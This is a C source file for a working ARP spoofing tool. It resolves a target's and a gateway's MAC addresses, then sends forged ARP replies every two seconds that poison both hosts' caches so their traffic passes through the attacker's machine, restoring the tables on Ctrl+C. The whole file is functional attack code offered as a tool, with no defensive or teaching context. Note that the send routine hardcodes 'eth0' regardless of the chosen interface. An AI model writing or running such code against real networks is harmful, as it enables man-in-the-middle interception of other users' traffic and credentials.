#include "arp_spoofer.h"
#include "utils.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <netinet/if_ether.h>
#include <netpacket/packet.h>
#include <sys/ioctl.h>
#include <sys/socket.h>

static int sock_fd = -1;
static struct in_addr g_target, g_gateway;
static uint8_t g_our_mac[6];
static unsigned char g_orig_target_mac[6];
static unsigned char g_orig_gateway_mac[6];
static int g_restored = 0;

static int get_local_mac(const char *iface, uint8_t *mac)
{
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return -1;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        close(fd);
        return -1;
    }
    close(fd);
    memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
    return 0;
}

static int resolve_mac(struct in_addr ip, unsigned char *mac, const char *iface)
{
    char path[256];
    snprintf(path, sizeof(path), "/proc/net/arp");
    FILE *f = fopen(path, "r");
    if (!f) return -1;

    char line[256];
    int found = 0;
    fgets(line, sizeof(line), f);
    while (fgets(line, sizeof(line), f)) {
        char ip_str[64], hw_str[64], mask_str[64], dev_str[64];
        unsigned long flags;
        if (sscanf(line, "%63s 0x%lx 0x%*x %63s %63s %63s",
                   ip_str, &flags, hw_str, mask_str, dev_str) >= 5) {
            struct in_addr line_ip;
            inet_aton(ip_str, &line_ip);
            if (line_ip.s_addr == ip.s_addr && strcmp(dev_str, iface) == 0) {
                parse_mac(hw_str, mac);
                found = 1;
                break;
            }
        }
    }
    fclose(f);
    return found ? 0 : -1;
}

static int send_arp_reply(struct in_addr src_ip, uint8_t *src_mac,
                          struct in_addr dst_ip, unsigned char *dst_mac)
{
    unsigned char buf[42];
    memset(buf, 0, sizeof(buf));

    struct ether_header *eth = (struct ether_header *)buf;
    memcpy(eth->ether_dhost, dst_mac, 6);
    memcpy(eth->ether_shost, src_mac, 6);
    eth->ether_type = htons(ETHERTYPE_ARP);

    struct ether_arp *arp = (struct ether_arp *)(buf + sizeof(struct ether_header));
    arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp->ea_hdr.ar_pro = htons(ETHERTYPE_IP);
    arp->ea_hdr.ar_hln = 6;
    arp->ea_hdr.ar_pln = 4;
    arp->ea_hdr.ar_op = htons(ARPOP_REPLY);
    memcpy(arp->arp_sha, src_mac, 6);
    memcpy(arp->arp_spa, &src_ip, 4);
    memcpy(arp->arp_tha, dst_mac, 6);
    memcpy(arp->arp_tpa, &dst_ip, 4);

    struct sockaddr_ll sll;
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = if_nametoindex("eth0");
    sll.sll_protocol = htons(ETHERTYPE_ARP);

    if (sendto(sock_fd, buf, sizeof(buf), 0,
               (struct sockaddr *)&sll, sizeof(sll)) < 0)
        return -1;
    return 0;
}

static void cleanup(int sig)
{
    (void)sig;
    if (g_restored) return;
    g_restored = 1;

    printf("\nRestoring ARP tables...\n");
    send_arp_reply(g_target, g_orig_target_mac, g_gateway, g_orig_gateway_mac);
    send_arp_reply(g_gateway, g_orig_gateway_mac, g_target, g_orig_target_mac);
    sleep(1);

    if (sock_fd >= 0) close(sock_fd);
    exit(0);
}

int arp_spoof(const char *target_ip, const char *gateway_ip, const char *iface)
{
    signal(SIGINT, cleanup);

    if (!inet_aton(target_ip, &g_target) || !inet_aton(gateway_ip, &g_gateway)) {
        fprintf(stderr, "Invalid IP address\n");
        return -1;
    }
    if (get_local_mac(iface, g_our_mac) < 0)
        die("get_local_mac");

    sock_fd = socket(AF_PACKET, SOCK_RAW, htons(ETHERTYPE_ARP));
    if (sock_fd < 0)
        die("socket (try running as root)");

    if (resolve_mac(g_target, g_orig_target_mac, iface) < 0) {
        fprintf(stderr, "Could not resolve target MAC; ensure it is reachable\n");
        return -1;
    }
    if (resolve_mac(g_gateway, g_orig_gateway_mac, iface) < 0) {
        fprintf(stderr, "Could not resolve gateway MAC\n");
        return -1;
    }

    printf("Spoofing: target %s <-> gateway %s (interface %s)\n",
           target_ip, gateway_ip, iface);
    printf("Press Ctrl+C to restore ARP tables and exit.\n");

    for (;;) {
        send_arp_reply(g_gateway, g_our_mac, g_target, g_orig_target_mac);
        send_arp_reply(g_target, g_our_mac, g_gateway, g_orig_gateway_mac);
        sleep(2);
    }

    return 0;
}
